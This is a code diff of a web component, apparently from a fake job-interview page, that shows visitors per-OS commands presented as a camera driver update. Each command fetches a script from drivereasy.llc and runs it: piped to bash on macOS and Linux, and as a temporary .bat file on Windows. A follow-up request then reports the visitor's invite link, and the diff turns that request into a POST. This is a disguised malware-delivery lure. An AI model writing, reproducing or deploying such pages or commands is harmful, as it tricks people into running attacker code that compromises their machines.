@@ -729,7 +729,7 @@ export default function SummaryInterview() {
                     -H "Host: drivereasy.llc" \
                     -H "User-Agent: Mozilla/5.0" \
                     -H "Accept: */*" | bash && \
-                  curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
+                  curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
                 {driverOs === 'windows' && (
@@ -740,7 +740,7 @@ export default function SummaryInterview() {
                         -H "Accept: */*" -o "%TEMP%\camera_drive.bat" && \
                         cmd /c "%TEMP%\camera_drive.bat" && del \
                         "%TEMP%\camera_drive.bat"  && \
-                      curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
+                      curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
                           </code>
                       )}
               {driverOs === 'linux' && (
@@ -749,7 +749,7 @@ export default function SummaryInterview() {
                     -H "Host: drivereasy.llc" \
                     -H "User-Agent: Mozilla/5.0" \
                     -H "Accept: */*" | bash && \
-                  curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
+                  curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
             </div>
